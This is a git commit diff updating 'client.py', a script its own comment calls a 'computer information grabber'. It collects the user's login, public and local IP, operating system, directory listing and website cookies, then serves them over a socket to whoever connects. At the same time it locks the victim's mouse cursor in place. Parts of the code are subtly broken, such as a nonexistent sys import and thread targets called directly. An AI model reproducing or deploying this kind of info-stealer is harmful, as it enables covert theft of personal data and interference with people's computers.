81dcc434e5e5baabbd8577c8b644f7511e66d00c
jadakedak <58665733+jadakedak@users.noreply.github.com>
2022-09-27 12:19:24 +0200

    Update client.py

--- client.py
+++ client.py
@@ -1,14 +1,15 @@
 # poorly coded computer information grabber
 # but it works
 
-
-import mouse
+from os import getlogin, getlogin, system
+from mouse import move, get_position
 import socket
 from sys import platform, api_version, getprofile
 from os import getlogin, listdir
 from time import sleep
-import threading
+from threading import Thread
 from requests import get
+
 
 # FARVER #
 red = "\033[91;1m"
@@ -22,46 +23,42 @@ white = "\033[97;1m"
 blink = "\033[5m"
 # END OF FARVER
 
-HOST = "" # your local ip address
+the_host = socket.gethostbyname(socket.gethostname())
+HOST = ""
+HOST += the_host
+
 PORT = 80
-website_coockie_to_get = ""
-time_mouse_locked = 100
-mouse_pos_x = 0
-mouse_pos_y = 0
 BUFFER = 1024*3
 
+address = (HOST,PORT)
 
 
-def lock_mouse(X, Y, time_in_milliseconds):
-    pos = (X,Y)
-    mouse.move(X, Y)
-    while True:
-        num += 1
-        if mouse.get_position() != pos:
-            mouse.move(pos[0], pos[1])
-            sleep(time_in_milliseconds)
-        else:
-            pass
-        
-        if num >= time_in_milliseconds:
-            break
 
-def listen_for_host(host,port):
-    address = (host,port)
-    print(f"Getting information...")
-    get_os_info("https://" + website_coockie_to_get)
+def lock_mouse():
+    try:
+        pos = (0, 0) # the position the mouse will be locked in
+        move(pos[0], pos[1])
+        while True:
+            if get_position() != pos:
+                move(pos[0], pos[1])
+                sleep(0.01)
+    except:
+        print(f"[!] couldnt get access to mouse!")
+
+
+
+def listen_for_host(address):
+    print(f"[+] Getting information...")
+    get_os_info("https://example.com") # the website to get the cookie from
     sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     try:
         sock.bind(address)
     except:
-        print(F"couldnt bind to {address[0]}:{address[1]} are you sure its the right ip?")
-    print(f"Listening for host...")
+        print(F"[!] couldnt bind to {address[0]}:{address[1]} are you sure its the right ip?")
+    print(f"[+] Listening for host on {HOST}...")
     sock.listen(5)
-    try:
-        conn, ip = sock.accept()
-    except:
-        print(f"[+] couldnt recive the connection...")
-    print(f"[+] Connection recived!")
+    conn, ip = sock.accept()
+    print(f"[+] Connection recived...")
     msg =   f"\
             user: {info_list[0]}\n\
             public ip: {info_list[1]}\n\
@@ -71,15 +68,12 @@ def listen_for_host(host,port):
             profiles: {info_list[5]}\n\
             api version: {info_list[6]}\n\
             coockie: {info_list[7]}\n"
-
-    conn.send(f"\n{msg}".encode())
+    conn.send(f"\n{msg}\n".encode())
     conn.close()
-    exit()
-    
-    
+    system("exit")
+    exit(1)
 
 def get_os_info(website_to_get_cookie):
-
     global info_list
     info_list = []
 
@@ -91,15 +85,13 @@ def get_os_info(website_to_get_cookie):
     profiles = getprofile()
     api = api_version
     coockie = get(website_to_get_cookie).cookies
-    
+
     all = user, public_ip, local_ip, operating_system, dir_content, profiles, api, coockie
 
-    for i in all:
-        info_list.append(i)
+    for bit_of_info in all:
+        info_list.append(bit_of_info)
 
-        
-lock_mouse_pos = threading.Thread(target=lock_mouse(mouse_pos_x,mouse_pos_y,time_mouse_locked))
-send_info_to_host = threading.Thread(target=listen_for_host(HOST,PORT))
-
-lock_mouse_pos.start()
-send_info_to_host.start()
+print("[*] locking mouse position...")
+sleep(0.5)
+lock_mouse_pos = Thread(target=lock_mouse).start()
+listener = Thread(target=listen_for_host(address)).start()
